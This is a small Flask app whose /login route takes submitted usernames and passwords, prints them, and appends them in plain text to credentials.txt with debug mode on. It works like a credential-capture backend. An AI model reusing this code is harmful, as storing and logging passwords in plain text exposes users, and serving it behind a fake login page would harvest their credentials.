from flask import Flask as f,request,render_template
app=f(__name__)
@app.route("/login",methods=["GET","POST"])
def login():
    if request.method=="GET":
        return render_template("login.html")
    if request.method == "POST":

        print("POST REQUEST RECEIVED")

        u = request.form["username"]
        p = request.form["password"]

        print(u)
        print(p)

        a = open("credentials.txt", "a")
        a.write(f"username:{u}\tpassword:{p}\n")
        a.close()

        return "<script>alert('data saved successfully')</script>"
if __name__=="__main__":
    app.run(debug=True)